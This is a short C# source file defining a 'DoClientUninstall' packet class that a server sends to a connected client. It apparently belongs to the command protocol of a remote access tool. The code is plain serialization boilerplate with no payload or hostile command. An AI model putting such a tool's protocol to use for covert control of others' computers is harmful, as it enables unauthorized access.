using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoClientUninstall : IPacket
    {
        public DoClientUninstall()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}